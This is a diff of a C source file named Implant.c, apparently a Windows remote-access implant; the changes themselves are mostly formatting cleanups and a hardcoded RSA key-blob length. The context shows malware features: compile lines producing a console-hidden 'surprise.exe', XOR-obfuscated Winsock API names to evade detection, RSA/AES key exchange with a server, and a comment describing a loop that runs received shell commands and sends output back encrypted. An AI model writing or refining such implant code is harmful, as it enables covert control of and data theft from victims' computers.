@@ -3,7 +3,6 @@
 #include "Communication.h"
 #include <stdio.h>
 
-
 // Compilation command: x86_64-w64-mingw32-gcc Implant.c -o surprise.exe -lws2_32 -lbcrypt -s
 // futiv command : x86_64-w64-mingw32-gcc Implant.c -o surprise.exe -lws2_32 -lbcrypt -mwindows -s
 int main()
@@ -120,7 +119,7 @@ int main()
     BCRYPT_ALG_HANDLE rsaAlgorithm = NULL;
     BCRYPT_KEY_HANDLE rsaKey = NULL;
     BYTE *rsaPbinput = NULL;
-    ULONG rsaBlobLen = 0; // length of the RSA public key blob received from the server
+    ULONG rsaBlobLen = 283; // length of the RSA public key blob received from the server
     BYTE rsaEncrypted[512];
     ULONG rsaEncryptedLen = sizeof(rsaEncrypted);
     BCRYPT_OAEP_PADDING_INFO oaepInfo = {0};
@@ -136,7 +135,7 @@ int main()
 
     char s_WSAStartup[] = {0x1C, 0x18, 0x0A, 0x18, 0x3F, 0x2A, 0x39, 0x3F, 0x3E, 0x3B, 0x00}; // WSAStartup
     char s_WSASocketA[] = {0x1C, 0x18, 0x0A, 0x18, 0x24, 0x28, 0x20, 0x2E, 0x3F, 0x0A, 0x00}; // WSASocketA
-    char s_connect[] =    {0x28, 0x24, 0x25, 0x25, 0x2E, 0x28, 0x3F, 0x00};                      // connect
+    char s_connect[] = {0x28, 0x24, 0x25, 0x25, 0x2E, 0x28, 0x3F, 0x00};                      // connect
     decode(s_WSAStartup, 'K', sizeof(s_WSAStartup) - 1);
     decode(s_WSASocketA, 'K', sizeof(s_WSASocketA) - 1);
     decode(s_connect, 'K', sizeof(s_connect) - 1);
@@ -224,9 +223,6 @@ int main()
         return 0;
     }
 
-
-
-
     printf("%s\n", (char *)rsaPbinput);
 
     status = BCryptImportKeyPair(
@@ -238,7 +234,6 @@ int main()
         rsaBlobLen,
         0);
 
-
     if (!BCRYPT_SUCCESS(status))
     {
         HeapFree(GetProcessHeap(), 0, rsaPbinput);
@@ -249,7 +244,9 @@ int main()
         BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
         BCryptCloseAlgorithmProvider(rsaAlgorithm, 0);
         return 0;
-    }else printf("key imported !");
+    }
+    else
+        printf("key imported !");
 
     HeapFree(GetProcessHeap(), 0, rsaPbinput);
     rsaPbinput = NULL;
@@ -279,12 +276,6 @@ int main()
 
     BCryptDestroyKey(rsaKey);
     rsaKey = NULL;
-
-    
-
-
-
-
 
     // Main receive loop: receive encrypted command packets, decrypt them with AES-GCM, execute shell commands,
     // and send the command output back encrypted after the first RSA-encrypted AES key response.
@@ -412,4 +403,3 @@ int main()
     }
     return 0;
 }
-
